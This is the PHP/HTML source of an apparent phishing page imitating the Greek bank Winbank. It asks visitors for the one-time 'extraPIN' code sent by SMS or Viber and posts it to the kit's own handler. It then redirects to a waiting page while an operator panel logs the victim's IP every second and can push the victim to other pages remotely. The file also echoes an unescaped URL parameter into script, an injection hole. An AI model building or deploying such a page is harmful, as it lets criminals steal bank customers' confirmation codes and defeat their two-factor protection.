<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Winbank</title>
    <link rel="stylesheet" href="res/main.css">
</head>
<body style="background:#F1F1F0;">
<header>
<div class="container">
<div class="left">
<img src="res/logo.svg">
</div>
<div class="center">
<img src="res/links-lg.png" class="lg">
<img src="res/links-sm.png" class="sm">
</div>
<div class="right">
<img src="res/biglogo.svg">
</div>
</div>
</header>
<main style="background:#F1F1F0;">
<div class="container">




<div class="forma">

<div class="title">Επιβεβαίωση σύνδεσης</div>
<div class="text">
Εισαγάγετε το extraPIN που στείλαμε στον αριθμό σας μέσω Viber ή SMS
</div>

<?php 
if(isset($_GET['e'])){
    echo '<div class="col" style="margin:20px 0; color:red;">Λάθος κωδικός επιβεβαίωσης. Παρακαλούμε ελέγξτε τον κωδικό και προσπαθήστε ξανά.
    </div>';
}
?>

<div class="col">
    <label>Εισάγετε τον κωδικό</label><br>
    <input type="text" id="sms" style="width:400px;">
</div>

<div class="col">
    <button style="width:200px;" onclick="sbmt()">Επιβεβαίωση</button>
</div>


</div>






</div>
</main>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
    $("#sms").mask("00000000");

    

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sbmt();
    }
});

function sbmt(){
    var sms = $("#sms").val();
    var sub = true;
    $("#sms").removeClass("error");
    if(sms.length<4){
        $("#sms").addClass("error");
        sub=false;
    }

    if(sub){
        $.post("post.php",{sms:sms},(res)=>{
            window.location="wait.php";            
        });
    }

}

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);
 
</script>
</body>
</html>